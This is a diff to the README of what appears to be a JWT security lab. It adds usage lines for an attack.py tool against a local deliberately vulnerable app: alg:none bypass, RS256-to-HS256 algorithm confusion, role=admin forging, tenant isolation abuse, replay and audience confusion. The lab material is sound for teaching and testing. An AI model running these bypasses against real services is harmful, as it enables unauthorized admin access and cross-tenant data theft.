@@ -84,7 +84,30 @@ curl -X POST http://localhost:5001/login \
 
 ## Attack Commands
 
+To run these attacks, first get a token via the `/login` endpoint, then use the master CLI:
 
+```bash
+# 1. Enumerate Claims
+python attack.py inspect $TOKEN
+
+# 2. Fuzz Authorization Boundaries
+python attack.py fuzz $TOKEN --target http://localhost:5001/admin/vulnerable
+
+# 3. alg:none Bypass
+python attack.py none $TOKEN --target http://localhost:5001/admin/vulnerable --set role=admin
+
+# 4. RS256→HS256 Algorithm Confusion
+python attack.py confusion --target http://localhost:5001 --endpoint http://localhost:5001/admin/vulnerable --set role=admin
+
+# 5. Tenant Isolation Abuse
+python attack.py tenants $TOKEN --target http://localhost:5001/tenant-data/vulnerable/companyB --tenant companyB
+
+# 6. Token Replay Attack (Blocked by Secure Validator)
+python attack.py replay $TOKEN --target http://localhost:5001/admin/vulnerable --count 5
+
+# 7. Audience Confusion Attack (Blocked by Secure Validator)
+python attack.py audience $TOKEN --target http://localhost:5001/admin/vulnerable
+```
 
 ## Project Structure
 
